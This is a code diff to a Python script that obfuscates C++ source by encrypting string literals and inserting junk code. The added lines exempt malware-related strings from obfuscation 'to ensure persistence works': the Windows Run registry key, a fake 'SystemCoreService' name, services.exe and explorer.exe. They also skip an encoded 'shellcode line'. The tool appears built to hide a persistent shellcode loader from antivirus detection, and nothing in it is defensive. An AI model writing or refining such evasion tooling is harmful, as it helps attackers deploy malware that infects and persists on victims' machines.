@@ -10,14 +10,31 @@ def obfuscate_strings(code):
     string_literal_regex = re.compile(r'(L)?"((?:[^"\\]|\\.)*)"')
     string_map = {}
 
+    # Exclude critical strings from obfuscation to ensure persistence works
+    excluded_strings = [
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "SystemCoreService",
+        "APPDATA",
+        "\\\\services.exe",
+        "explorer.exe",
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    ]
+
     def replacer(match):
         is_wide_char = match.group(1)
         original_string = match.group(2)
 
+        # Skip obfuscation for excluded strings
+        if original_string in excluded_strings:
+            return match.group(0)
+
         last_newline = code.rfind('\n', 0, match.start())
         line_start = last_newline + 1 if last_newline != -1 else 0
         line = code[line_start:match.start()]
-        if line.strip().startswith('#'):
+        stripped_line = line.strip()
+
+        # Skip obfuscation for preprocessor directives and the shellcode line
+        if stripped_line.startswith('#') or 'std::string en_sh' in stripped_line:
             return match.group(0)
 
         if original_string in string_map:
@@ -82,10 +99,6 @@ def add_junk_code(code):
 def run_obfuscation(input_file, output_file):
     with open(input_file, "r") as f:
         code = f.read()
-
-    b64_pattern = re.compile(r'std::string\s+base64_chars\s*=\s*[^;]+;', re.DOTALL)
-    single_line_b64_string = 'std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";'
-    code = b64_pattern.sub(single_line_b64_string, code, count=1)
 
     code = add_junk_code(code)
     code, string_decoder = obfuscate_strings(code)
